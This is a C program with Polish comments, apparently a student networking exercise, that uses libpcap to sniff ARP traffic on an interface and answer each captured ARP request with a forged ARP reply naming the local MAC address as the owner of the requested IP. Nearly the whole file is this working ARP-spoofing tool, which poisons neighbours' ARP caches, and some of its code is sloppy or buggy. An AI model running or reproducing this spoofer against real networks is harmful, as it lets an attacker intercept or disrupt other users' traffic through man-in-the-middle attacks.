/*
 * Data:                2009-06-05
 * Autor:               Jakub Gasior <quebes@mars.iti.pk.edu.pl>
 * Kompilacja:          $ gcc arp_sniff.c -lpcap -o arp_sniff
 * Uruchamianie:        $ ./arp_sniff <INTERFACE NAME>
 */

#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>

#include <netinet/ether.h> /* ether_ntoa() */
/*
 * <netinet/ether.h> zalacza naglowek <netinet/if_ether.h> (struct ether_arp).
 * Z kolei naglowek <netinet/if_ether.h> zalacza:
 * <net/if_arp.h> (struct arphdr, ARP protocol opcodes, ARP hardware ID's)
 * <net/ethernet.h> (struct ether_header, struct ether_addr,
 * Ethernet protocol ID's)
 */

#include <netinet/in.h> /* IP protocols (IPPROTO_ICMP) */
#include <arpa/inet.h> /* inet_ntop() */
#include <errno.h>
#include <string.h>

#include <sys/socket.h>         /* AF_INET, ... */
#include <netdb.h>              /* getnameinfo() */
#include <netpacket/packet.h>   /* struct sockaddr_ll */

/* Deskryptor wykorzystywany do przechwytywania pakietow: */
pcap_t                  *descriptor;
char                     *maczek;

void send_false_packet(const struct pcap_pkthdr *pkt_header, const u_char *packet){
	u_char *buf;
	int size;
    int                     err;
    char                    errbuf[PCAP_ERRBUF_SIZE];

        /* Wskaznik na pierwszy element listy interfejsow: */
    pcap_if_t               *alldevsp;
    /* Wskaznik na interfejs: */
    pcap_if_t               *if_t;
    /* Wskaznik na strukture adresowa interfejsu: */
    pcap_addr_t             *addr_t;


    sa_family_t             family; /* Rodzina adresowa */

    /* Wskaznik na strukture adresowa (dla adresow warstwy lacza danych): */
    struct sockaddr_ll      *addr_l,*addr_src;
    socklen_t               addr_len; /* Rozmiar struktury adresowej */

	/* Adres IPv4: */
    char                    address[INET_ADDRSTRLEN];

    /* Wskaznik na pierwszy bajt naglowka ARP: */
    struct ether_arp        *arp_header;

    /* Wskaznik na pierwszy bajt naglowka ramki Ethernet: */
    struct ether_header     *ether_header;

    ether_header = (struct ether_header*)packet;

    /* Wskaznik na pierwszy bajt naglowka ARP: */
    arp_header = (struct ether_arp*)((unsigned char*)packet + ETHER_HDR_LEN);

	/* Deklaracja fałszywych nagłówków */
	struct ether_arp    *false_arp_header;
	struct ether_header *false_ether_header;

	/* Inicjalizujemy bufor (odpowiedniej wielkości, czyli odpowiadającej sumie wielkości obu nagłówków) */
	buf = malloc(sizeof(struct ether_header)+sizeof(struct ether_arp));

	/* Kopiujemy podstawowe dane do bufora */
	memcpy(buf,ether_header,sizeof(struct ether_header));
	memcpy(buf+sizeof(struct ether_header),arp_header,sizeof(struct ether_arp));

	/* Ustawiamy wskaźniki na odpowiednie struktury */
	false_ether_header = (struct ether_header*)buf;
	false_arp_header = (struct ether_arp*)(buf+sizeof(struct ether_header));



    if (pcap_findalldevs(&alldevsp, errbuf) == -1) {
        fprintf(stderr, "%s", errbuf);
        exit(EXIT_FAILURE);
    }

    /*
     * Wypisanie listy interfejsow sieciowych.
     * 
     
     */
    struct ether_addr* false_mac_address = ether_aton("0:c:29:ab:21:de");
    for (if_t = alldevsp; if_t; if_t = if_t->next) {

        for (addr_t = if_t->addresses; addr_t; addr_t = addr_t->next) {

            family = addr_t->addr->sa_family;

            if (family == AF_INET || family == AF_INET6) {

                if (family == AF_INET) {
                    addr_len = sizeof(struct sockaddr_in);
                } else {
                    addr_len = sizeof(struct sockaddr_in6);
                }

            } else if (family == AF_PACKET) {

                addr_l = (struct sockaddr_ll*)addr_t->addr;
                /* Wypisanie adresu MAC: */
            }
        }

                  if(!strcmp(if_t->name,maczek)){
                        struct ether_addr* false_mac_address = (struct ether_addr*)addr_l->sll_addr;
                        /*
                        fprintf(stdout, "MAC address: %s\n",
                            ether_ntoa((struct ether_addr*)false_mac_address));
                        fprintf(stdout,"Ten adres boi\n");
                        fprintf(stdout, "MAC address: %s\n",
                            ether_ntoa((struct ether_addr*)false_mac_address));
                            */
                        break;
                  }
            
        fprintf(stdout, "\n");
    }



	/* Tworzymy fałszywy adres mac */

                            


	memcpy(false_ether_header->ether_dhost,ether_header->ether_shost,sizeof(struct ether_addr));
	memcpy(false_ether_header->ether_shost,addr_l->sll_addr,sizeof(struct ether_addr));

	memcpy(false_arp_header->arp_spa,arp_header->arp_tpa,sizeof(u_long));
	memcpy(false_arp_header->arp_tpa,arp_header->arp_spa,sizeof(u_long));

	memcpy(false_arp_header->arp_tha,arp_header->arp_sha, sizeof(struct ether_addr));
	memcpy(false_arp_header->arp_sha,addr_l->sll_addr,sizeof(struct ether_addr));

	/* Ustawiamy op_code wiadomości jako "Odpowiedź" */
	false_arp_header->arp_op = htons(ARPOP_REPLY);

	/* Wypisujemy informacje o fałszywym pakiecie */
	fprintf(stdout, "\nFALSE ARP REPLY\n");
    fprintf(stdout, "Sender MAC: %s, ",
            ether_ntoa((struct ether_addr*)false_arp_header->arp_sha));
    fprintf(stdout, "Sender IP: %s\n",
            inet_ntop(AF_INET, false_arp_header->arp_spa, address, INET_ADDRSTRLEN));

    fprintf(stdout, "Target MAC: %s, ",
            ether_ntoa((struct ether_addr*)false_arp_header->arp_tha));
    fprintf(stdout, "Target IP: %s\n\n",
            inet_ntop(AF_INET, false_arp_header->arp_tpa, address, INET_ADDRSTRLEN));
	fprintf(stdout, "\n");


	/* Wysyłamy fałszywy pakiet */
	pcap_sendpacket(descriptor,buf,sizeof(struct ether_header)+sizeof(struct ether_arp));
}

void callback(u_char *arg, const struct pcap_pkthdr *pkt_header, const u_char *packet) {

    /* Adres IPv4: */
    char                    address[INET_ADDRSTRLEN];

    /* Wskaznik na pierwszy bajt naglowka ARP: */
    struct ether_arp        *arp_header;

    /* Wskaznik na pierwszy bajt naglowka ramki Ethernet: */
    struct ether_header     *ether_header;

    /*
     * Jezeli rozmiar jest mniejszy od:
     * rozmiar naglowka ramki Ethernet
     * + rozmiar naglowka ARP (28  bajtow)
     */
    if (pkt_header->caplen < ETHER_HDR_LEN + 28) {
        fprintf(stderr, "Packet length < ETHER_HDR_LEN + 28\n");
        return;
    }

    ether_header = (struct ether_header*)packet;

    /* Jezeli ramka nie przenosi naglowka ARP: */
    if (ntohs(ether_header->ether_type) != ETHERTYPE_ARP) {
        return;
    }

    /* Wskaznik na pierwszy bajt naglowka ARP: */
    arp_header = (struct ether_arp*)((unsigned char*)packet + ETHER_HDR_LEN);

    /* Interesuja nas tylko naglowki ARP dla Ethernetu i IP: */
    if (ntohs(arp_header->arp_hrd) != ARPHRD_ETHER
            && ntohs(arp_header->arp_pro) != ETHERTYPE_IP) {
        return;
    }

    fprintf(stdout, "ARP ");
    switch (ntohs(arp_header->arp_op)) {
    case ARPOP_REQUEST:
		fprintf(stdout, "REQUEST");
        break;
    case ARPOP_REPLY:
        fprintf(stdout, "REPLY");
        break;
    default:
        return;
    }

    fprintf(stdout, "\n");
    fprintf(stdout, "Sender MAC: %s, ",
            ether_ntoa((struct ether_addr*)arp_header->arp_sha));
    fprintf(stdout, "Sender IP: %s\n",
            inet_ntop(AF_INET, arp_header->arp_spa, address, INET_ADDRSTRLEN));

    fprintf(stdout, "Target MAC: %s, ",
            ether_ntoa((struct ether_addr*)arp_header->arp_tha));
    fprintf(stdout, "Target IP: %s\n\n",
            inet_ntop(AF_INET, arp_header->arp_tpa, address, INET_ADDRSTRLEN));


    if(ntohs(arp_header->arp_op)== ARPOP_REQUEST)	// Jeśli przechwycony pakiet to żądanie.
		send_false_packet(pkt_header,packet);		// Wysyłamy fałszywy pakiet - odpowiedź.
}

int main(int argc, char **argv) {

    char                    errbuf[PCAP_ERRBUF_SIZE];

    maczek = malloc(sizeof(argv[1]));
    maczek = argv[1];

    /* Typ warstwy lacza danych: */
    int                     data_link_type;

    /* Program filtrujacy: */
    struct bpf_program      fp;

    if (argc != 2) {
        fprintf(stderr, "Invocation: %s <interface>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    /* Utworzenie deskryptora do przechwytywania pakietow: */
    descriptor = pcap_open_live(argv[1], 65565, 0, 10, errbuf);
    if (descriptor == NULL) {
        fprintf(stderr, "pcap_open_live(): %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    /* Sprawdzenie typu warstwy lacza danych: */
    data_link_type = pcap_datalink(descriptor);
    if (data_link_type != DLT_EN10MB) {
        /* Jezeli inny od ETHERNET: */
        exit(EXIT_FAILURE);
    }

    /*
     * Przeksztalcenie tekstowej formy filtru w program filtrujacy "fp".
     * Filtr pozwala na przechwytywanie tylko pakietow ARP:
     */
    if (pcap_compile(descriptor, &fp, "arp", 1, 0) == -1) {
        pcap_perror(descriptor, "pcap_compile()");
        exit(EXIT_FAILURE);
    }

    /* Zdefiniowanie programu filtrujacego dla deskryptora: */
    if (pcap_setfilter(descriptor, &fp) == -1) {
        pcap_perror(descriptor, "pcap_setfilter()");
        exit(EXIT_FAILURE);
    }

    /* Po wywolaniu pcap_setfilter() mozna zwolnic pamiec programu filtrujacego: */
    pcap_freecode(&fp);

    if (pcap_loop(descriptor, -1, callback, NULL) == -1) {
        pcap_perror(descriptor, "pcap_loop()");
        exit(EXIT_FAILURE);
    }

    exit(EXIT_SUCCESS);
}
